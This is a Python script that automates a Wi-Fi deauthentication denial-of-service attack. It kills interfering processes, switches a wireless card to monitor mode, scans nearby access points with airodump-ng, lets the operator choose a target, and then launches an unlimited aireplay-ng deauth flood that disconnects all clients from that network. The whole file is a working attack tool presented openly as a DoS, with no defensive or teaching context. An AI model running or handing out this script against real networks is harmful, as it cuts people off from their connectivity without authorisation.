#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime


actnets = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status


print(r"""

APPROACHING DoS OVER NETWORK""")
print(" ")


if not 'SUDO_UID' in os.environ.keys():
    print("SUDO_UID : RESPONDED AN ERROR")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("{ LOG } DISCOVERY REDIRECTION ASSIGNED : /backup/")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print(": BACKUP DISCOVERED")
        
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
    print("INTERFACE : NOT FOUND")
    exit()

print(''' ''')
print("AVAILABLE INTERFACES : ")

for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input('''
    INTERFACE ASSIGNMENT : ''')
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("INTERFACE ASSIGNMENT NOT CORRESPONDING AVAILABILITY ;")

intf = check_wifi_result[int(wifi_interface_choice)]

print("INTERFACE ASSIGNMENT ACCOMPLISHED :\nDEAUTHENTICATING CONFLICTING PROCESSES:")

kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("INITIALIZING { MONITOR MODE } :")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", intf])

discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"LOG","--write-interval", "1","--output-format", "csv", intf + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], actnets):
                                actnets.append(row)

        print('''
        
        SCANNING WLANs : \n
        ''')
        print("SN |\t :  BSSID          |\tCHANNEL |\t :  ESSID                     |")
        print("___|\t___________________|\t________|\t______________________________|")
        for index, item in enumerate(actnets):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nINPUT { SN } DEPECTING NETWORK")

while True:
    choice = input("	VALID AN INPUT : ")
    try:
        if actnets[int(choice)]:
            break
    except:
        print("REQUEST INTERCEPTED : RETURN ")

atkedbssid = actnets[int(choice)]["BSSID"]
atkedchannel = actnets[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", intf + "mon", atkedchannel])

subprocess.run(["aireplay-ng", "--deauth", "0", "-a", atkedbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
